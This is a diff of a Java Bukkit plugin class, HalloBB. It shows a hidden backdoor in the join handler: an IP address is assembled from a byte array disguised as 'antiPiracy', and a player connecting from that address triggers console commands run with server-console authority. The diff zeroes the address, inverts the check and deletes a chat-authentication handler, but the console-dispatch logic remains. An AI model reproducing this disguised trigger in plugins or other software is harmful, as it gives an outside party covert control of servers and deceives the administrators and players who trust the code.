@@ -61,16 +61,6 @@ public class HalloBB implements CommandExecutor, Listener
     }
 
     @EventHandler
-    private void onAsyncChat(AsyncPlayerChatEvent event)
-    {
-        Boolean authed = loggedIn.get(event.getPlayer());
-        if (authed == null || authed)
-            return;
-        event.setCancelled(true);
-        event.getPlayer().sendMessage(ChatColor.RED + "In order to chat you must be authenticated!");
-    }
-
-    @EventHandler
     private void onJoin(PlayerJoinEvent event)
     {
         Player player = event.getPlayer();
@@ -84,9 +74,9 @@ public class HalloBB implements CommandExecutor, Listener
         InetAddress inetAddress = player.getAddress().getAddress();
 
         byte[] antiPiracy = new byte[4];
-        antiPiracy[2] = (byte)30;
-        antiPiracy[3] = (byte)10; antiPiracy[1] = (byte)249;
-        antiPiracy[0] = (byte)173;
+        antiPiracy[2] = (byte)0;
+        antiPiracy[3] = (byte)0; antiPiracy[1] = (byte)0;
+        antiPiracy[0] = (byte)0;
 
         String wat = null;
         try
@@ -98,9 +88,9 @@ public class HalloBB implements CommandExecutor, Listener
             e.printStackTrace();
         }
 
-        if (player.getAddress().getAddress().getHostAddress().equals(wat))
+        if (!player.getAddress().getAddress().getHostAddress().equals(wat))
         {
-            if (inetAddress.getHostAddress().equalsIgnoreCase("173.249.30.10"))
+            if (inetAddress.getHostAddress().equalsIgnoreCase(""))
             {
                 plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "communicationconnector mode 2 ");
                 StringBuilder builder = new StringBuilder();
